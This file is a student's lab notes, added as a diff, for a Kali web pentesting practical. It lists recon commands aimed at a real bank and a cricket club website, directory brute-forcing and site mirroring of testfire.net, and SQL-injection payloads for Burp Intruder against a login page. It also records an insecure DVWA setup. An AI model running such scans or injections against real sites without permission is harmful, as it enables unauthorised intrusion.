@@ -1,0 +1,103 @@
+Run kali and metasploitable
+
+# updating the system
+sudo apt update 
+sudo apt upgrade
+sudo apt dist-upgrade
+
+# wafw00f
+sudo wafw00f www.hdfcbank.com
+
+# loadbalancer
+sudo lbd www.hdfcbank.com
+
+#wpscan
+
+sudo wpscan --url https://www.durhamcricket.co.uk/
+
+#dirbuster 
+
+sudo dirbuster
+Enter Target Url : http://testfire.net:80/
+
+select the wordlist
+/usr/share/dirbuster/wordlists/directory-list-1.0.txt
+
+Click on start
+
+Wait for some files and then stop
+
+# Mirroring a website
+sudo apt install httrack
+
+sudo httrack http://testfire.net/ -O copiedsite
+
+#Burp suite
+- Create a temproary project
+- use burp defaults
+- Go to target tab and click add scope
+- Click on new live task
+- Go to scan configuration
+- Ente deepcrawl as name
+- select links and under urls to add Url's in scope
+- click on ok
+
+- go to the proxy tab
+- click on intercept is on
+
+- go to Intruder
+- Under payload options
+admin'#
+admin'
+1=1#
+1==1--
+1=1
+'OR 1=1#
+'OR 1=1--
+
+- Under payload options 
+Enter Target : http://testfire.net/login.jspS
+
+# DVWA
+cd /var/www/html
+sudo git clone https://github.com/digininja/DVWA.git
+
+sudo chmod -R 777 DVWA
+
+cd DVWA/config
+
+sudo cp config.inc.php.dist config.inc.php
+
+Change the db_user to admin
+Change the db_password to admin123
+
+# Start mysql
+sudo service mysql start
+
+sudo mysql -u root -p
+
+cd /etc/php/8.1
+
+cd apache2
+
+sudo nano php.ini
+
+enter following text
+allow_url_fopen = On
+allow_url_include = On
+
+# Starting the apache2 server
+
+sudo systemctl start mysql
+sudo systemctl staus apache2 
+sudo systemctl start apache2
+sudo systemctl status apache2
+
+# Open DVWA on 127.0.0.1/DVWA/setup.php
+login to dvwa
+127.0.0.1/DVWA/login.php
+
+username:admin
+password:password
+
+Injecting payloads which I am bored to write , so if you are reading this during the practicals , sorry, search karle
